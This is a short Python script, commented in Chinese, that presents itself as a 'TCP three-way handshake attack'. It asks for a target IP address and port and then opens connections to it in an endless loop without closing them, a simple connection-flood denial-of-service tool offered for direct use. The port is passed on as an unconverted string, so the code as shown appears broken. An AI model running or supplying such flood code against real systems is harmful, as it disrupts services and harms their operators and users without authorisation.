# -*- coding: utf-8 -*-
import socket


# socket tcp三次握手攻击
def socket_flood(ip, port):
    print(ip)
    while True:
        s = socket.socket()
        s.connect((ip, port))


if __name__ == '__main__':
    ip = input("请输入IP：")
    port = input("请输入端口：")
    socket_flood(ip, port)